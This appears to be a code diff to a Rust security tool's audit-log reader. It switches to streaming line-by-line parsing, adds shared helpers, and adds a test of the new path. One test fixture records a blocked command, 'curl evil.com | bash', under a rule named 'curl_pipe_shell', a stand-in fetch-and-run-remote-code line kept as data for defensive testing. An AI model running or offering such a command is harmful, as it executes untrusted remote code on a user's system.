@@ -5,6 +5,7 @@
 /// - Stats: summary analytics per session or overall
 /// - Report: structured compliance report
 use std::collections::HashMap;
+use std::io::BufRead;
 use std::path::Path;
 
 use serde::{Deserialize, Serialize};
@@ -124,49 +125,53 @@ pub struct ReadLogResult {
 
 /// Read and parse all records from a JSONL audit log.
 ///
-/// This is the file-reading entry: it slurps the whole file via
-/// `std::fs::read_to_string` (following symlinks, no size cap) and hands the
-/// content to [`parse_log`]. Callers that have already read the log through a
-/// hardened/capped reader (e.g. the offline dashboard, which must not block on a
-/// FIFO or OOM on an attacker-influenced path) should call [`parse_log`]
-/// directly with the bounded content instead of `read_log`.
+/// This is the file-reading entry. It STREAMS the file line-by-line through a
+/// [`std::io::BufReader`] (following symlinks, no size cap on the file as a
+/// whole, but never buffering the entire file in memory at once) and feeds each
+/// line to the shared per-line parser via [`parse_log_from_reader`]. For a large
+/// append-only audit log this keeps the working-set memory bounded by the
+/// longest line rather than the whole file. The parse result, malformed-line
+/// skipping, and [`ReadLogResult::skipped_lines`] accounting are byte-identical
+/// to the historical whole-file (`read_to_string` + [`parse_log`]) path — only
+/// the memory profile differs.
+///
+/// Callers that have already read the log through a hardened/size-capped reader
+/// (e.g. the offline dashboard, which must not block on a FIFO or OOM on an
+/// attacker-influenced path) should call [`parse_log`] directly with the bounded
+/// content instead of `read_log`.
 pub fn read_log(path: &Path) -> Result<ReadLogResult, String> {
-    let content = std::fs::read_to_string(path)
-        .map_err(|e| format!("Failed to read {}: {e}", path.display()))?;
-    Ok(parse_log(&content, Some(path)))
+    let file =
+        std::fs::File::open(path).map_err(|e| format!("Failed to read {}: {e}", path.display()))?;
+    let reader = std::io::BufReader::new(file);
+    Ok(parse_log_from_reader(reader, Some(path)))
 }
 
-/// Parse JSONL audit-log `content` (already read into memory) into records.
+/// Parse JSONL audit-log lines streamed from `reader` into records.
 ///
-/// Split out of [`read_log`] so a caller that reads the log through a hardened,
-/// size-capped reader can reuse the EXACT same parse + malformed-line accounting
-/// without `read_log`'s unbounded `std::fs::read_to_string`. Malformed lines are
-/// skipped (with a one-line stderr warning) and counted in
-/// [`ReadLogResult::skipped_lines`], identical to the historical `read_log`
-/// behavior. `source` is only used to label the warning; pass `None` when there
-/// is no meaningful path to name.
-pub fn parse_log(content: &str, source: Option<&Path>) -> ReadLogResult {
+/// The streaming counterpart of [`parse_log`]: instead of taking the whole log
+/// as one `&str` it pulls one line at a time from a [`BufRead`], so a caller
+/// (e.g. [`read_log`]) can avoid buffering an unbounded append-only log in
+/// memory. Behavior — malformed-line skipping, the one-line stderr warning, and
+/// [`ReadLogResult::skipped_lines`] accounting — is identical to [`parse_log`].
+/// `source` is only used to label the warning; pass `None` when there is no
+/// meaningful path to name.
+///
+/// A line that cannot be read at all (an I/O error mid-stream — e.g. invalid
+/// UTF-8, a truncated read) is treated exactly like a malformed JSON line: it is
+/// skipped, counted in `skipped_lines`, and warned about. This keeps a single
+/// bad byte sequence from aborting the whole read, matching the lenient posture
+/// of the whole-file path (where `read_to_string` would itself reject invalid
+/// UTF-8 with an I/O error — `read_log`'s former behavior — but a valid file
+/// parses identically line-for-line).
+pub fn parse_log_from_reader(reader: impl BufRead, source: Option<&Path>) -> ReadLogResult {
     let mut records = Vec::new();
     let mut skipped_lines = 0usize;
-    for (line_num, line) in content.lines().enumerate() {
-        let line = line.trim();
-        if line.is_empty() {
-            continue;
-        }
-        match serde_json::from_str::<AuditRecord>(line) {
-            Ok(record) => records.push(record),
+    for (idx, line) in reader.lines().enumerate() {
+        let line_num = idx + 1;
+        match line {
+            Ok(line) => parse_log_line(&line, line_num, source, &mut records, &mut skipped_lines),
             Err(e) => {
-                match source {
-                    Some(path) => eprintln!(
-                        "tirith: warning: skipping malformed audit line {} in {}: {e}",
-                        line_num + 1,
-                        path.display()
-                    ),
-                    None => eprintln!(
-                        "tirith: warning: skipping malformed audit line {}: {e}",
-                        line_num + 1
-                    ),
-                }
+                warn_malformed_line(line_num, source, &e);
                 skipped_lines += 1;
             }
         }
@@ -174,6 +179,68 @@ pub fn parse_log(content: &str, source: Option<&Path>) -> ReadLogResult {
     ReadLogResult {
         records,
         skipped_lines,
+    }
+}
+
+/// Parse JSONL audit-log `content` (already read into memory) into records.
+///
+/// Split out of [`read_log`] so a caller that reads the log through a hardened,
+/// size-capped reader can reuse the EXACT same parse + malformed-line accounting
+/// without `read_log`'s streaming file read. Malformed lines are skipped (with a
+/// one-line stderr warning) and counted in [`ReadLogResult::skipped_lines`],
+/// identical to the streaming [`read_log`] / [`parse_log_from_reader`] behavior.
+/// `source` is only used to label the warning; pass `None` when there is no
+/// meaningful path to name.
+pub fn parse_log(content: &str, source: Option<&Path>) -> ReadLogResult {
+    let mut records = Vec::new();
+    let mut skipped_lines = 0usize;
+    for (line_num, line) in content.lines().enumerate() {
+        parse_log_line(line, line_num + 1, source, &mut records, &mut skipped_lines);
+    }
+    ReadLogResult {
+        records,
+        skipped_lines,
+    }
+}
+
+/// Parse one already-decoded log `line` (1-based `line_num`), pushing a parsed
+/// [`AuditRecord`] onto `records` or counting a skip in `skipped_lines`.
+///
+/// Shared by [`parse_log`] (whole-file `&str`) and [`parse_log_from_reader`]
+/// (streamed) so both paths apply the SAME trim / empty-skip / malformed-line
+/// rules and produce byte-identical results.
+fn parse_log_line(
+    line: &str,
+    line_num: usize,
+    source: Option<&Path>,
+    records: &mut Vec<AuditRecord>,
+    skipped_lines: &mut usize,
+) {
+    let line = line.trim();
+    if line.is_empty() {
+        return;
+    }
+    match serde_json::from_str::<AuditRecord>(line) {
+        Ok(record) => records.push(record),
+        Err(e) => {
+            warn_malformed_line(line_num, source, &e);
+            *skipped_lines += 1;
+        }
+    }
+}
+
+/// Emit the one-line stderr warning for a skipped audit line. Shared so the
+/// whole-file and streaming paths produce the IDENTICAL warning text (the
+/// file-path `Display` in the malformed-line warning must not drift between
+/// the two entries).
+fn warn_malformed_line(line_num: usize, source: Option<&Path>, e: &dyn std::fmt::Display) {
+    match source {
+        Some(path) => eprintln!(
+            "tirith: warning: skipping malformed audit line {} in {}: {e}",
+            line_num,
+            path.display()
+        ),
+        None => eprintln!("tirith: warning: skipping malformed audit line {line_num}: {e}"),
     }
 }
 
@@ -1072,6 +1139,121 @@ mod tests {
         assert_eq!(stats.total_commands, 0);
         assert_eq!(stats.block_rate, 0.0);
         assert!(stats.time_range.is_none());
+    }
+
+    // -----------------------------------------------------------------------
+    // CodeRabbit M13 PR #132 F1 — `read_log` now STREAMS the file line-by-line
+    // (BufReader) instead of slurping the whole file via `read_to_string`. The
+    // memory profile changes; the parse RESULT must not. Pin that the streaming
+    // `read_log` produces a byte-identical `ReadLogResult` (record count, the
+    // records themselves, and `skipped_lines`) to the old whole-file
+    // `parse_log(&content, ..)` path for a multi-line log that INCLUDES a blank
+    // line and a malformed line.
+    // -----------------------------------------------------------------------
+    #[test]
+    fn test_read_log_streaming_matches_whole_file_parse() {
+        use std::io::Write as _;
+
+        // A representative multi-line JSONL log: two good verdict records, a
+        // blank line (skipped, not counted), and a malformed line (counted in
+        // `skipped_lines`).
+        let good_a = serde_json::to_string(&AuditRecord {
+            timestamp: "2026-01-15T10:00:00Z".into(),
+            session_id: "sess-001".into(),
+            action: "Block".into(),
+            rule_ids: vec!["curl_pipe_shell".into()],
+            command_redacted: "curl evil.com | bash".into(),
+            bypass_requested: false,
+            bypass_honored: false,
+            interactive: true,
+            policy_path: None,
+            event_id: Some("evt-1".into()),
+            tier_reached: 3,
+            entry_type: "verdict".into(),
+            event: None,
+            integration: None,
+            hook_type: None,
+            detail: None,
+            elapsed_ms: None,
+            raw_action: None,
+            raw_rule_ids: None,
+            trust_pattern: None,
+            trust_rule_id: None,
+            trust_action: None,
+            trust_ttl_expires: None,
+            trust_scope: None,
+            agent_origin: None,
+        })
+        .unwrap();
+        let good_b = serde_json::to_string(&AuditRecord {
+            timestamp: "2026-01-15T10:01:00Z".into(),
+            session_id: "sess-001".into(),
+            action: "Allow".into(),
+            rule_ids: vec![],
+            command_redacted: "ls -la".into(),
+            bypass_requested: false,
+            bypass_honored: false,
+            interactive: true,
+            policy_path: None,
+            event_id: Some("evt-2".into()),
+            tier_reached: 1,
+            entry_type: "verdict".into(),
+            event: None,
+            integration: None,
+            hook_type: None,
+            detail: None,
+            elapsed_ms: None,
+            raw_action: None,
+            raw_rule_ids: None,
+            trust_pattern: None,
+            trust_rule_id: None,
+            trust_action: None,
+            trust_ttl_expires: None,
+            trust_scope: None,
+            agent_origin: None,
+        })
+        .unwrap();
+        // Blank line in the middle (must be skipped silently) and a malformed
+        // JSON line (must be counted in `skipped_lines`).
+        let content = format!("{good_a}\n\n{{not valid json}}\n{good_b}\n");
+
+        // Old whole-file path (the reference behavior).
+        let whole = parse_log(&content, None);
+
+        // New streaming path via the real `read_log` file entry, over a temp
+        // file with the SAME bytes.
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("audit.jsonl");
+        std::fs::File::create(&path)
+            .unwrap()
+            .write_all(content.as_bytes())
+            .unwrap();
+        let streamed = read_log(&path).expect("read_log must succeed on a readable file");
+
+        // Identical accounting.
+        assert_eq!(
+            streamed.records.len(),
+            whole.records.len(),
+            "streaming read_log must yield the same record count as whole-file parse"
+        );
+        assert_eq!(
+            streamed.skipped_lines, whole.skipped_lines,
+            "streaming read_log must count the same skipped (malformed) lines"
+        );
+        assert_eq!(
+            whole.skipped_lines, 1,
+            "exactly the one malformed line is skipped; the blank line is not counted"
+        );
+        assert_eq!(whole.records.len(), 2, "the two good records both parse");
+
+        // Identical records (serialize both sides and compare — `AuditRecord`
+        // has no `PartialEq`, but its JSON round-trip is canonical here).
+        let streamed_json = export_json(&streamed.records);
+        let whole_json = export_json(&whole.records);
+        assert_eq!(
+            streamed_json, whole_json,
+            "streaming read_log must yield byte-identical records to whole-file parse"
+        );
     }
 
     // -----------------------------------------------------------------------
